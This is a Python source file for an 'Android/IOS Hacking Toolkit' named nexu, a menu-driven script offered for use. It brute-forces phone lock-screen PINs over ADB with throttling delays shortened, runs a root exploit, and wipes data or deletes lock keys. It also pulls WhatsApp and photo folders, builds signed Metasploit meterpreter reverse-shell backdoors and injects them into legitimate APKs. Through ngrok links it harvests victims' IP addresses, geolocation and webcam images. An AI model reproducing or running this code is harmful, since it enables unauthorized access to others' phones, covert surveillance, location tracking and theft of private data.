#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os, sys, subprocess, time, re, platform, shutil, signal
from pathlib import Path
from datetime import datetime

# ------------------------------ Colors ------------------------------
class c:
    m   = "\033[0;31m"      # red
    k   = "\033[0;33m"      # yellow
    h   = "\033[0;32m"      # green
    b   = "\033[0;34m"      # blue
    lm  = "\033[1;31m"      # pink
    lk  = "\033[1;33m"      # bright yellow
    lh  = "\033[1;32m"      # light green
    lb  = "\033[1;34m"      # light blue
    n   = "\033[0m"         # neutral
    w   = "\033[1;37m"      # thick white

# -------------------------- Paths & Globals -------------------------
SCRIPT_DIR = Path(__file__).parent.resolve()
FILES_DIR  = SCRIPT_DIR / "Files"
BACKDOOR_DIR = SCRIPT_DIR / "backdoor"
INFO_DIR   = SCRIPT_DIR / "info"
CAM_DIR    = SCRIPT_DIR / "cam"

# ------------------------- New Banner (nexu) ------------------------
def show():
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    RESET = "\033[0m"
    BOLD = "\033[1m"

    # nexu logo
    print(f"{BLUE}{BOLD}")
    print("  ███╗   ██╗███████╗██╗  ██╗██╗   ██╗")
    print("  ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║")
    print("  ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║")
    print("  ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║")
    print("  ██║ ╚████║███████╗██╔╝ ╚██╗╚██████╔╝")
    print("  ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ")
    print(RESET)

    # penguin
    print(f"{GREEN}{BOLD}")
    print("        .--.")
    print("       |o_o |")
    print("       |:_/ |")
    print("      //   \\ \\")
    print("     (|     | )")
    print("    /'\\   /`\\")
    print("    \\)=(/")
    print(RESET)

    # developer
    print(f"{YELLOW}{BOLD}")
    print("     Developed by: zaazouamouad")
    print(RESET)

def banner():
    show()
    print(f"{c.lb}Android/IOS Hacking Toolkit{c.n}\n")

# ------------------------- Root Check -------------------------------
def check_root():
    if os.geteuid() != 0:
        print(f"{c.m}You must be root to run the script{c.n}")
        sys.exit(1)

# ------------------------- Utility Functions ------------------------
def run(cmd, shell=True, check=False):
    return subprocess.run(cmd, shell=shell, capture_output=True, text=True)

def run_out(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout.strip()

def is_tool(name):
    return shutil.which(name) is not None

def clear():
    os.system("clear")

def wait_for_device():
    print(f"{c.lh}[*] Waiting for device...{c.n}")
    run("adb wait-for-device")

# --------------------------- OS Detect ------------------------------
def detect_os():
    banner()
    print(f"{c.m}        Detect Your OS {c.n}")
    time.sleep(0.5)
    print("Kernel:", platform.uname().system)
    time.sleep(0.5)
    dist = run_out("lsb_release -i 2>/dev/null || echo Unknown")
    print(dist)
    codename = run_out("lsb_release -c 2>/dev/null || echo Unknown")
    print(codename)
    time.sleep(0.5)
    ip = run_out("ip addr show | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'")
    print(f"Your IP Address: {ip}")
    time.sleep(2)
    clear()

# ------------------------ Detect Config -----------------------------
def detect_config():
    banner()
    print(f"{c.m}    Detect Installed Package {c.n}")
    print("   Checking ADB, Metasploit, APKTool...")
    time.sleep(1)
    required = ["adb", "msfvenom", "msfconsole", "apktool", "scrcpy", "php", "curl"]
    for tool in required:
        status = f"{c.lh}Found{c.n}" if is_tool(tool) else f"{c.m}Missing{c.n}"
        print(f"   {tool}: {status}")
    print(f"\n{c.k}[!] For full functionality install missing tools{c.n}")
    time.sleep(1)
    clear()

# ----------------------------- Main Menu ---------------------------
def main_menu():
    while True:
        clear()
        banner()
        # Menu in bright yellow
        print(f"""{c.lk}
  1. Update
  2. Brute Pin 4 Digit
  3. Brute Pin 6 Digit
  4. Brute LockScreen Using Wordlist
  5. Bypass LockScreen (Antiguard)
  6. Root Android (Supersu)
  7. ADB Toolkit
  8. Reset Data
  9. Remove LockScreen (Root)
 10. Metasploit Backdoor
 11. Control Android (Scrcpy)
 12. Phone Info
 13. IP Logger (Over Internet)
 14. Get WebCam (Over Internet)
 15. FireStore Vulnerability Scan
 99. Exit
{c.n}""")
        choice = input("senpai@nexu:~# ").strip()
        if choice == "1": update()
        elif choice == "2": brute_pin4()
        elif choice == "3": brute_pin6()
        elif choice == "4": brute_wordlist()
        elif choice == "5": bypass_antiguard()
        elif choice == "6": root_supersu()
        elif choice == "7": adb_toolkit()
        elif choice == "8": reset_data()
        elif choice == "9": remove_lock_root()
        elif choice == "10": metasploit_menu()
        elif choice == "11": control_scrcpy()
        elif choice == "12": phone_info()
        elif choice == "13": ip_logger()
        elif choice == "14": get_webcam()
        elif choice == "15": firestore_scan()
        elif choice == "99":
            print("Goodbye!")
            sys.exit(0)
        else:
            print(f"{c.m}Invalid option!{c.n}")
            time.sleep(2)

# --------------------------- 1. Update ------------------------------
def update():
    print("Updating nexu...")
    base = "https://raw.githubusercontent.com/tegal1337/CiLocks/main"
    try:
        run(f"wget {base}/cilocks -O {SCRIPT_DIR}/cilocks")
        run(f"wget {base}/data/config -O {SCRIPT_DIR}/data/config")
        run(f"wget {base}/data/os -O {SCRIPT_DIR}/data/os")
        os.chmod(SCRIPT_DIR / "cilocks", 0o755)
        print("Update done. Restart the script.")
        sys.exit(0)
    except Exception as e:
        print(f"{c.m}Update failed: {e}{c.n}")

# ---------------------------- 2. Brute 4 ----------------------------
def brute_pin4():
    wait_for_device()
    run("adb shell input keyevent 26")
    run("adb shell input keyevent 82")
    print("Brute Pin 4 Digit")
    for i in range(10000):
        pin = f"{i:04d}"
        print(f"Try => {pin}", end="\r")
        for digit in pin:
            run(f"adb shell input keyevent {int(digit)+7}")
        run("adb shell input keyevent 66")
        if (i+1) % 5 == 0:
            print("Delay 2s")
            time.sleep(2)			# changed from 30s to 2s
            run("adb shell input keyevent 82")
            run("adb shell input swipe 407 1211 378 85")

# ---------------------------- 3. Brute 6 ----------------------------
def brute_pin6():
    wait_for_device()
    run("adb shell input keyevent 26")
    run("adb shell input keyevent 82")
    print("Brute Pin 6 Digit")
    for i in range(1000000):
        pin = f"{i:06d}"
        print(f"Try => {pin}", end="\r")
        for digit in pin:
            run(f"adb shell input keyevent {int(digit)+7}")
        run("adb shell input keyevent 66")
        if (i+1) % 5 == 0:
            print("Delay 2s")
            time.sleep(2)			# changed from 30s to 2s
            run("adb shell input keyevent 82")
            run("adb shell input swipe 407 1211 378 85")

# ---------------------------- 4. Wordlist ---------------------------
def brute_wordlist():
    wait_for_device()
    run("adb shell input keyevent 26")
    run("adb shell input keyevent 82")
    file_path = input("Wordlist path: ").strip()
    if not Path(file_path).exists():
        print(f"{c.m}File not found!{c.n}")
        return
    with open(file_path, "r") as f:
        words = [line.strip() for line in f if line.strip()]
    for idx, word in enumerate(words, 1):
        print(f"Try => {word}")
        for ch in word:
            # using input text for each character (may need refinement)
            run(f"adb shell input text {ch}")
        run("adb shell input keyevent 66")
        if idx % 5 == 0:
            print("Delay 2s")
            time.sleep(2)			# changed from 30s to 2s
            run("adb shell input keyevent 82")
            run("adb shell input swipe 407 1211 378 85")

# --------------------------- 5. AntiGuard ---------------------------
def bypass_antiguard():
    pkg = "io.kos.antiguard"
    res = run(f"adb shell pm list packages | grep {pkg}")
    if res.returncode == 0:
        run(f"adb uninstall {pkg}")
    else:
        apk = SCRIPT_DIR / "AntiGuard" / "AntiGuard.apk"
        if not apk.exists():
            print(f"{c.m}AntiGuard.apk not found!{c.n}")
            return
        run(f"adb install {apk}")
        run(f"adb shell am start {pkg}/.unlock")

# --------------------------- 6. Supersu Root ------------------------
def root_supersu():
    modules_dir = SCRIPT_DIR / "modules"
    if not (modules_dir / "fakebackup.ab").exists():
        print(f"{c.m}Required modules not found!{c.n}")
        return
    wait_for_device()
    run(f"adb restore {modules_dir}/fakebackup.ab")
    print("Exploiting...")
    run('adb shell "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99 2>/dev/null; do :; done; echo Overwrote local.prop!"')
    check = run_out("adb shell cat /data/local.prop")
    if check:
        print("Rooted! Rebooting...")
        run("adb reboot")
        time.sleep(2)
        wait_for_device()
        run("adb shell mount -o rw,remount /system")
        run(f"adb push {modules_dir}/su-static /system/xbin/su")
        run("adb shell /data/local/tmp/busybox chown 0:0 /system/xbin/su")
        run("adb shell /data/local/tmp/busybox chmod 6777 /system/xbin/su")
        run(f"adb push {modules_dir}/Superuser.apk /system/app/")
        run("adb shell rm /data/local.prop")
        run("adb reboot")
        print("Supersu installed.")
    else:
        print(f"{c.m}Root failed.{c.n}")

# --------------------------- 7. ADB Toolkit -------------------------
def adb_toolkit():
    while True:
        clear()
        banner()
        print(f"{c.m}           ADB Toolkit{c.n}\n")
        print(f"""{c.lk}
 1. Shell
 2. Screenshot
 3. Pull DCIM
 4. Pull WhatsApp
 5. Pull /sdcard
 6. Custom pull
 7. Backup (ab)
 8. Restore (ab)
 9. Reset permissions
10. Reboot
99. Main Menu
{c.n}""")
        sel = input("senpai@nexu:~# ").strip()
        if sel == "1":
            os.system("adb shell")
        elif sel == "2":
            name = f"screenshot-{datetime.now().strftime('%H%M%S')}.png"
            dest = FILES_DIR / "Screenshot"
            dest.mkdir(parents=True, exist_ok=True)
            run(f"adb exec-out screencap -p > {dest/name}")
            print(f"Saved: {dest/name}")
        elif sel == "3":
            dest = FILES_DIR / f"DCIM-{datetime.now().strftime('%H%M%S')}"
            run(f"adb pull /sdcard/DCIM/ {dest}")
            print(f"Saved: {dest}")
        elif sel == "4":
            dest = FILES_DIR / f"WhatsApp-{datetime.now().strftime('%H%M%S')}"
            run(f"adb pull /sdcard/WhatsApp/ {dest}")
            print(f"Saved: {dest}")
        elif sel == "5":
            dest = FILES_DIR / f"sdcard-{datetime.now().strftime('%H%M%S')}"
            run(f"adb pull /sdcard/ {dest}")
            print(f"Saved: {dest}")
        elif sel == "6":
            src = input("Source path: ").strip()
            folder = input("Folder name: ").strip()
            dest = FILES_DIR / folder
            run(f"adb pull {src} {dest}")
            print(f"Saved: {dest}")
        elif sel == "7":
            backup_folder = SCRIPT_DIR / "backup"
            backup_folder.mkdir(exist_ok=True)
            run(f"adb backup -apk -shared -all -f {backup_folder}/backup.ab")
        elif sel == "8":
            backup_file = SCRIPT_DIR / "backup" / "backup.ab"
            if backup_file.exists():
                run(f"adb restore {backup_file}")
            else:
                print("backup.ab not found")
        elif sel == "9":
            run("adb shell pm reset-permissions")
        elif sel == "10":
            run("adb reboot")
        elif sel == "99":
            break
        else:
            print(f"{c.m}Invalid{c.n}")
        input("Press Enter...")

# --------------------------- 8. Reset Data --------------------------
def reset_data():
    print(f"{c.lk}1. Fastboot\n2. Recovery{c.n}")
    o = input("senpai@nexu:~# ").strip()
    if o == "1":
        run("adb reboot bootloader")
        time.sleep(5)
        run("fastboot erase userdata")
        run("fastboot erase cache")
    elif o == "2":
        run("adb shell recovery --wipe_data")
    else:
        print(f"{c.m}Invalid{c.n}")

# ------------------------ 9. Remove Lock (Root) ---------------------
def remove_lock_root():
    wait_for_device()
    run("adb shell su -c 'rm /data/system/*.key'")
    run("adb reboot")
    print("Done.")

# ------------------------- 10. Metasploit ---------------------------
def metasploit_menu():
    while True:
        clear()
        banner()
        print(f"{c.m}   Metasploit Backdoor Generator{c.n}\n")
        print(f"""{c.lk}
 1. Install APK to device
 2. Create Payload Backdoor (msfvenom) Signed
 3. Start Metasploit Listener
 4. Inject Payload in Original APK
99. Main Menu
{c.n}""")
        c_ = input("senpai@nexu:~# ").strip()
        if c_ == "1":
            apk = input("APK path: ").strip()
            run_app = input("Run after install? (y/n): ").strip().lower()
            run(f"adb install {apk}")
            if run_app == "y":
                pkg = input("Package name: ").strip()
                run(f"adb shell am start {pkg}/.unlock")
        elif c_ == "2":
            host = input("LHOST: ").strip()
            port = input("LPORT: ").strip()
            app_name = input("App name (without .apk): ").strip()
            BACKDOOR_DIR.mkdir(exist_ok=True)
            raw = BACKDOOR_DIR / "loli.apk"
            print(f"{c.lb}Creating payload...{c.n}")
            run(f"msfvenom -p android/meterpreter/reverse_tcp lhost={host} lport={port} R> {raw}")
            print("Signing...")
            keystore = BACKDOOR_DIR / "key.keystore"
            run(f"keytool -genkey -V -keystore {keystore} -alias hacked -keyalg RSA -keysize 2048 -validity 10000 -storepass android -keypass android -dname 'CN=Unknown'")
            run(f"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore {keystore} -storepass android {raw} hacked")
            run(f"jarsigner -verify -verbose {raw}")
            final = BACKDOOR_DIR / f"{app_name}.apk"
            run(f"zipalign -v 4 {raw} {final}")
            raw.unlink()
            keystore.unlink()
            print(f"Backdoor: {final}")
        elif c_ == "3":
            clear(); banner()
            host = input("LHOST: ").strip()
            port = input("LPORT: ").strip()
            print(f"{c.lk}Choose payload:{c.n}")
            print("1. android/meterpreter/reverse_tcp")
            print("2. osx/armle/execute/reverse_tcp")
            pch = input("> ").strip()
            if pch == "1":
                payload = "android/meterpreter/reverse_tcp"
            elif pch == "2":
                payload = "osx/armle/execute/reverse_tcp"
            else:
                return
            print(f"{c.lk}Listener options:{c.n}")
            print("1. multi/handler")
            print("2. post/android/manage/remove_lock")
            print("3. post/android/manage/remove_lock_root")
            print("4. apple_ios/safari_jit")
            exp = input("> ").strip()
            exploits = {
                "1": "use exploit/multi/handler",
                "2": "use post/android/manage/remove_lock",
                "3": "use post/android/manage/remove_lock_root",
                "4": "use exploit/apple_ios/browser/safari_jit"
            }
            if exp in exploits:
                cmd = f"msfconsole -x '{exploits[exp]}; set PAYLOAD {payload}; set LHOST {host}; set LPORT {port}; exploit'"
                if is_tool("xterm"):
                    subprocess.Popen(["xterm", "-T", "nexu Exploit", "-geometry", "100x35", "-e", cmd])
                else:
                    os.system(cmd)
        elif c_ == "4":
            host = input("LHOST: ").strip()
            port = input("LPORT: ").strip()
            original = input("Original APK: ").strip()
            app_name = input("Output APK name: ").strip()
            BACKDOOR_DIR.mkdir(exist_ok=True)
            out = BACKDOOR_DIR / "loli.apk"
            run(f"msfvenom --platform android -x {original} -p android/meterpreter/reverse_tcp lhost={host} lport={port} -o {out}")
            final = BACKDOOR_DIR / f"{app_name}.apk"
            out.rename(final)
            print(f"Backdoor: {final}")
        elif c_ == "99":
            break
        else:
            print(f"{c.m}Invalid{c.n}")
        input("Press Enter...")

# ------------------------ 11. Scrcpy -------------------------------
def control_scrcpy():
    if is_tool("scrcpy"):
        os.system("scrcpy")
    else:
        print(f"{c.m}Install scrcpy first: apt install scrcpy{c.n}")

# ------------------------ 12. Phone Info ----------------------------
def phone_info():
    wait_for_device()
    manufact = run_out("adb shell getprop ro.product.manufacturer")
    model = run_out("adb shell getprop ro.product.model")
    version = run_out("adb shell getprop ro.build.version.release")
    sdk = run_out("adb shell getprop ro.build.version.sdk")
    print(f"Device: {manufact} {model} (Android {version}, API {sdk})")

# ------------------------ 13. IP Logger -----------------------------
def ip_logger():
    clear(); banner()
    print(f"{c.m}   IP Logger (Over Internet){c.n}\n")
    check_tools_php_curl()
    INFO_DIR.mkdir(exist_ok=True)
    ngrok_path = ensure_ngrok()
    php_proc = subprocess.Popen(["php", "-S", "127.0.0.1:3333", "-t", str(INFO_DIR)],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    ngrok_proc = subprocess.Popen([str(ngrok_path), "http", "3333"],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(5)
    try:
        import requests
        tun = requests.get("http://127.0.0.1:4040/api/tunnels").json()
        url = tun["tunnels"][0]["public_url"]
        print(f"{c.lb}[*] Send link: {c.n}{url}")
    except:
        print("Ngrok API not accessible.")
        php_proc.terminate(); ngrok_proc.terminate(); return

    print(f"\n{c.lk}[*] Waiting for target... Ctrl+C to abort{c.n}")
    try:
        while True:
            if (INFO_DIR / "ip.txt").exists():
                with open(INFO_DIR / "ip.txt") as f: data = f.read()
                ip = re.search(r"IP:\s*(\S+)", data)
                ua = re.search(r"User-Agent:\s*(.+)", data)
                if ip: print(f"{c.lk}IP: {ip.group(1)}")
                if ua: print(f"{c.lk}UA: {ua.group(1)}")
                save_data = SCRIPT_DIR / "saved.ip.txt"
                with open(save_data, "a") as sf: sf.write(data)
                os.remove(INFO_DIR / "ip.txt")
                print(f"{c.lk}Waiting for geolocation...{c.n}")
                while not (INFO_DIR / "geolocate.txt").exists():
                    time.sleep(1)
                with open(INFO_DIR / "geolocate.txt") as gf: gdata = gf.read()
                lat = re.search(r"Latitude:\s*([\d.-]+)", gdata)
                lon = re.search(r"Longitude:\s*([\d.-]+)", gdata)
                if lat and lon:
                    print(f"Location: {lat.group(1)}, {lon.group(1)}")
                    print(f"Google Maps: https://maps.google.com/?q={lat.group(1)},{lon.group(1)}")
                save_geo = SCRIPT_DIR / "saved.geolocate.txt"
                with open(save_geo, "a") as sf: sf.write(gdata)
                os.remove(INFO_DIR / "geolocate.txt")
                break
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    finally:
        php_proc.terminate(); ngrok_proc.terminate()

# ------------------------ 14. Get WebCam ----------------------------
def get_webcam():
    clear(); banner()
    print(f"{c.m}   Get WebCam (Over Internet){c.n}\n")
    check_tools_php_curl()
    CAM_DIR.mkdir(exist_ok=True)
    ngrok_path = ensure_ngrok()
    php_proc = subprocess.Popen(["php", "-S", "127.0.0.1:3333", "-t", str(CAM_DIR)],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    ngrok_proc = subprocess.Popen([str(ngrok_path), "http", "3333"],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(5)
    try:
        import requests
        tun = requests.get("http://127.0.0.1:4040/api/tunnels").json()
        url = tun["tunnels"][0]["public_url"]
        print(f"{c.lb}[*] Link: {c.n}{url}")
    except:
        print("Ngrok issue")
        php_proc.terminate(); ngrok_proc.terminate(); return

    print(f"{c.lk}[*] Waiting for image... Ctrl+C to exit{c.n}")
    try:
        while True:
            found = any(Path(CAM_DIR).glob("*.png")) or any(Path(CAM_DIR).glob("*.jpg"))
            if found:
                print(f"{c.m}[*] Image saved in {CAM_DIR}{c.n}")
                break
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        php_proc.terminate(); ngrok_proc.terminate()

# ------------------------ 15. Firestore Scan ------------------------
def firestore_scan():
    clear(); banner()
    print(f"{c.m}   FireStore Vulnerability Scanner{c.n}\n")
    apk = input("APK file path: ").strip()
    if not apk.endswith(".apk"):
        print(f"{c.m}[!] Must be .apk{c.n}")
        return
    if not is_tool("apktool"):
        print(f"{c.m}apktool not found{c.n}")
        return
    base = Path(apk).stem
    out_dir = f"fsp-{base}"
    print(f"{c.k}[*] Decompiling {apk}...{c.n}")
    run(f"apktool d {apk} -o {out_dir}")
    manifest = Path(out_dir) / "AndroidManifest.xml"
    if not manifest.exists():
        print(f"{c.m}Manifest missing{c.n}")
        shutil.rmtree(out_dir, ignore_errors=True)
        return
    with open(manifest, "r", errors="ignore") as m:
        if "firebase" not in m.read().lower():
            print(f"{c.m}Firebase not found{c.n}")
            shutil.rmtree(out_dir, ignore_errors=True)
            return
    print(f"{c.lk}[+] Firebase detected{c.n}")
    strings_xml = Path(out_dir) / "res" / "values" / "strings.xml"
    project_id = None
    if strings_xml.exists():
        with open(strings_xml, "r", errors="ignore") as s:
            for line in s:
                m = re.search(r'<string name="project_id">(.*?)</string>', line)
                if m:
                    project_id = m.group(1)
                    break
    if project_id:
        print(f"{c.lk}[+] Project ID: {project_id}{c.n}")
    match_str = "Lcom/google/firebase/firestore/FirebaseFirestore"
    collections = set()
    for smali in Path(out_dir).rglob("*.smali"):
        with open(smali, "r", errors="ignore") as sf:
            lines = sf.readlines()
        for i, line in enumerate(lines):
            if match_str in line:
                for j in range(i+1, min(i+5, len(lines))):
                    const_match = re.search(r'const-string\s+\S+,\s*"([^"]*)"', lines[j])
                    if const_match:
                        collections.add(const_match.group(1))
                        break
    if collections:
        print(f"{c.lk}[+] Collections ({len(collections)}):{c.n}")
        for col in sorted(collections):
            print(f"  {col}")
    else:
        print(f"{c.m}[-] No collections found{c.n}")
    shutil.rmtree(out_dir, ignore_errors=True)
    print(f"{c.k}[!] Warning: Accessing collections may incur costs{c.n}")

# ------------------------- Helper functions -------------------------
def check_tools_php_curl():
    if not is_tool("php") or not is_tool("curl"):
        print(f"{c.m}PHP and curl required. Install with: apt install php curl{c.n}")
        sys.exit(1)

def ensure_ngrok():
    ngrok_path = SCRIPT_DIR / "ngrok"
    if ngrok_path.exists():
        return ngrok_path
    print(f"{c.k}[*] Downloading ngrok...{c.n}")
    arch = platform.machine()
    if "arm" in arch.lower() or "aarch" in arch.lower():
        url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip"
    else:
        url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
    import urllib.request
    urllib.request.urlretrieve(url, "ngrok.zip")
    import zipfile
    with zipfile.ZipFile("ngrok.zip", "r") as z:
        z.extractall(SCRIPT_DIR)
    os.remove("ngrok.zip")
    os.chmod(ngrok_path, 0o755)
    return ngrok_path

# ------------------------- SIGINT Handler ---------------------------
def sig_handler(sig, frame):
    print(f"\n{c.k}Interrupted.{c.n}")
    sys.exit(0)

# ------------------------------- Main -------------------------------
if __name__ == "__main__":
    signal.signal(signal.SIGINT, sig_handler)
    check_root()
    detect_os()
    detect_config()
    try:
        main_menu()
    except KeyboardInterrupt:
        print("\nGoodbye!")
        sys.exit(0)
